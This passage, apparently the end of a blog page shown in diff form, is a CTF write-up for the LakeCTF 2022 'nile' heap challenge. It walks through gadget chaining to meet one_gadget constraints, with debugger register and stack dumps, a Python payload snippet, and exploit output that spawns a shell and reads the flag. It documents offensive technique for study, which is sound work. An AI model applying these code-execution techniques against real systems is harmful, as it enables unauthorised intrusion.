+0x00007fffffffda90│+0x0010: 0x00007ffff7fc8000  →  0x00007ffff7dff000  →  0x03010102464c457f
+0x00007fffffffda98│+0x0018: 0x00007ffff7ffda08  →  0x00007ffff7fd0000  →  0x00010102464c457f
+0x00007fffffffdaa0│+0x0020: 0x00007fffffffdaa0  →  [loop detected]
+0x00007fffffffdaa8│+0x0028: 0x00007fffffffdaa0  →  0x00007fffffffdaa0  →  [loop detected]</code></pre></figure>
+
+<p>Calling <code class="language-plaintext highlighter-rouge">0x7ffffacebabe</code>… Seems, we have rip control, yay…</p>
+
+<p>But wait… None of the one_gadget constraints can be fullfilled, and also none of the registers point anywhere useful to maybe do some stack pivoting =(</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xcda5d execve("/bin/sh", r12, rdx)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [rdx] == NULL || rdx == NULL</code></pre></figure>
+
+<p>This would have been a good candidate, since <code class="language-plaintext highlighter-rouge">r12</code> is already <code class="language-plaintext highlighter-rouge">0x0</code>, but <code class="language-plaintext highlighter-rouge">rdx</code> contains an address, thus we cannot use it (for now…).</p>
+
+<p>Well, this took quite some time to come up with a solution for, but after wading through countless gadgets to make anything useful from the situation, I came up with this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7f2cd44:	mov    rax,QWORD PTR [r15+0x60]
+0x7ffff7f2cd48:	call   QWORD PTR [rax+0x8]</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">$r15</code> is pointing to the <code class="language-plaintext highlighter-rouge">ld</code> region, we overwrote with our <code class="language-plaintext highlighter-rouge">pro plan</code> chunks.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/10gx 0x00007ffff7ffe1a0+0x60
+0x7ffff7ffe200:	0x000055555555ee70	0x0000000000000020
+0x7ffff7ffe210:	0x0000000000000000	0x000055555555d5c0
+0x7ffff7ffe220:	0x0000000000000040	0x0000000000000000
+0x7ffff7ffe230:	0x000055555555d610	0x0000000000000040
+0x7ffff7ffe240:	0x0000000000000000	0x000055555555d5c0
+
+gef➤  x/10gx 0x000055555555ee70
+0x55555555ee70:	0x5a5a5a5a5a5a5a5a	0x00000000deadbeef
+0x55555555ee80:	0x0000000000000000	0x0000000000000000
+0x55555555ee90:	0x0000000000000000	0x0000000000000031
+0x55555555eea0:	0x0000000000000041	0x0000000000000000
+0x55555555eeb0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>So, yeah, that’s the reason, I put that chunk there previously (hard to explain this whole mess in the right order).</p>
+
+<p>By using the above gadget, we can point <code class="language-plaintext highlighter-rouge">rax</code> to our chunk on the heap, and it will then jump to <code class="language-plaintext highlighter-rouge">rax+0x8</code> (which currently is <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>). Not quite there yet, but at least we have one register more containing an address, which is under our control.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x000055555555ee70  →  0x5a5a5a5a5a5a5a5a ("ZZZZZZZZ"?)
+$rbx   : 0x00007ffff7ffd000  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$rcx   : 0x0               
+$rdx   : 0x0000555555557dd8  →  0x0000555555555170  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
+$rsp   : 0x00007fffffffda70  →  0x00007ffff7f2cd4b  →  0x0000059a840fc085
+$rbp   : 0x00007fffffffdaf0  →  0x0000000000000000
+$rsi   : 0x0               
+$rdi   : 0x0000555555558060  →  0x00007ffff7fc2520  →  0x00000000fbad2887
+$rip   : 0xdeadbeef        
+$r8    : 0x2               
+$r9    : 0x1               
+$r10   : 0x00007ffff7f73ac0  →  0x0000000100000000
+$r11   : 0x246             
+$r12   : 0x0               
+$r13   : 0x00007fffffffda80  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$r14   : 0x0000555555557dd0  →  0x00005555555551c0  →  &lt;frame_dummy+0&gt; endbr64 
+$r15   : 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+─────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffda70│+0x0000: 0x00007ffff7f2cd4b  →  0x0000059a840fc085	 ← $rsp
+0x00007fffffffda78│+0x0008: 0x00007ffff7fe16ad  →  0x8b0e75f685c4758b
+0x00007fffffffda80│+0x0010: 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f	 ← $r13
+0x00007fffffffda88│+0x0018: 0x00007ffff7ffe750  →  0x00007ffff7fce000  →  0x00010102464c457f
+0x00007fffffffda90│+0x0020: 0x00007ffff7fc8000  →  0x00007ffff7dff000  →  0x03010102464c457f
+0x00007fffffffda98│+0x0028: 0x00007ffff7ffda08  →  0x00007ffff7fd0000  →  0x00010102464c457f
+[!] Cannot access memory at address 0xdeadbeef</code></pre></figure>
+
+<p>Still, we just went from one crash to another…</p>
+
+<p>But, we can now branch into another gadget:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7e7a4c7:	mov    rdx,QWORD PTR [rbx+0x40]
+0x7ffff7e7a4cb:	mov    rdi,rbx
+0x7ffff7e7a4ce:	sub    rdx,rsi
+0x7ffff7e7a4d1:	call   QWORD PTR [rax+0x70]</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"Z"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x000000000007b4c7</span><span class="p">)</span>
+	
+<span class="n">addfake</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>When executing this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x000055555555ee70  →  0x5a5a5a5a5a5a5a5a ("ZZZZZZZZ"?)
+$rbx   : 0x00007ffff7ffd000  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$rcx   : 0x0               
+$rdx   : 0x0000555555557dd8  →  0x0000555555555170  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
+$rsp   : 0x00007fffffffda70  →  0x00007ffff7f2cd4b  →  0x0000059a840fc085
+$rbp   : 0x00007fffffffdaf0  →  0x0000000000000000
+$rsi   : 0x0               
+$rdi   : 0x0000555555558060  →  0x00007ffff7fc2520  →  0x00000000fbad2887
+$rip   : 0x00007ffff7e7a4c7  →  0x48df894840538b48
+$r8    : 0x2               
+$r9    : 0x1               
+$r10   : 0x00007ffff7f73ac0  →  0x0000000100000000
+$r11   : 0x246             
+$r12   : 0x0               
+$r13   : 0x00007fffffffda80  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$r14   : 0x0000555555557dd0  →  0x00005555555551c0  →  &lt;frame_dummy+0&gt; endbr64 
+$r15   : 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7e7a4ba                  cmp    rdx, r13
+   0x7ffff7e7a4bd                  jae    0x7ffff7e7a718
+   0x7ffff7e7a4c3                  mov    rsi, QWORD PTR [rbx+0x10]
+ → 0x7ffff7e7a4c7                  mov    rdx, QWORD PTR [rbx+0x40]
+   0x7ffff7e7a4cb                  mov    rdi, rbx
+   0x7ffff7e7a4ce                  sub    rdx, rsi
+   0x7ffff7e7a4d1                  call   QWORD PTR [rax+0x70]
+   0x7ffff7e7a4d4                  test   rax, rax
+   0x7ffff7e7a4d7                  jle    0x7ffff7e7a6b0
+──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffda70│+0x0000: 0x00007ffff7f2cd4b  →  0x0000059a840fc085	 ← $rsp
+0x00007fffffffda78│+0x0008: 0x00007ffff7fe16ad  →  0x8b0e75f685c4758b
+0x00007fffffffda80│+0x0010: 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f	 ← $r13
+0x00007fffffffda88│+0x0018: 0x00007ffff7ffe750  →  0x00007ffff7fce000  →  0x00010102464c457f
+0x00007fffffffda90│+0x0020: 0x00007ffff7fc8000  →  0x00007ffff7dff000  →  0x03010102464c457f
+0x00007fffffffda98│+0x0028: 0x00007ffff7ffda08  →  0x00007ffff7fd0000  →  0x00010102464c457f
+
+gef➤  x/gx $rbx+0x40
+0x7ffff7ffd040:	0x0000000000000000</code></pre></figure>
+
+<p>This will now move the value from <code class="language-plaintext highlighter-rouge">rbx+0x40</code> (<code class="language-plaintext highlighter-rouge">0x0</code>) into <code class="language-plaintext highlighter-rouge">rdx</code> and then call <code class="language-plaintext highlighter-rouge">rax+0x70</code>. So, this will effectively zero out <code class="language-plaintext highlighter-rouge">rdx</code> and we fulfilled the constraints for the <code class="language-plaintext highlighter-rouge">one_gadget</code> from above (<code class="language-plaintext highlighter-rouge">r12 == 0 &amp; rdx == 0</code>).</p>
+
+<p>Remember, that I put the <code class="language-plaintext highlighter-rouge">one_gadget</code> address previously in one of the fake chunks? Surprise, it’s now exactly at <code class="language-plaintext highlighter-rouge">rax+0x70</code>…</p>
+
+<p>Finally at the end of the journey :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/home/kileak/ctf/lake/nilework/libc-2.32.so'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.polygl0ts.ch on port 3800: Done
+[*] LEAK         : 0x55a9f31a0b09
+[*] HEAP         : 0x55aca9d09600
+[*] HEAP guard   : 0x55aca9d09
+[*] LIBC leak    : 0x7fb8f7cafa60
+[*] LIBC         : 0x7fb8f7aed000
+[*] MAIN_ARENA   : 0x7fb8f7cafa00
+[*] PIE          : 0x55aca8ac2080
+[*] TARGET CHUNK : 0x7fb8f7ce61d0
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+Goodbye! Thank you for using Nile.
+$ ls
+flag
+ld-2.32.so
+libc-2.32.so
+run
+$ cat flag
+EPFL{Y3t_4n0th3r_h34pn0t3_th4t_w4s_1n_my_chall3ng3s_f0lder_f0r_t00_l0ng}</code></pre></figure>
+
+<p>Phew, this challenge took a lot of time, going down so many rabbit holes, redoing the code execution part again and again. Though, I was cursing a LOT in the middle of the night, I enjoyed the challenge quite a lot in hindsight.</p>
+
+<p>Still, quite curious for other peoples solution, to see, if it can be solved in an easier way, since this one was definitely a real pain.</p>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=LakeCTF Qualifications 2022 - nile&amp;url=https://kileak.github.io/ctf/2022/lakectf-nile/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/lakectf-nile/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2022/lakectf-nile';
+        var disqus_title = 'LakeCTF Qualifications 2022 - nile';
+        var disqus_url = 'https://kileak.github.io/ctf/2022/lakectf-nile';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
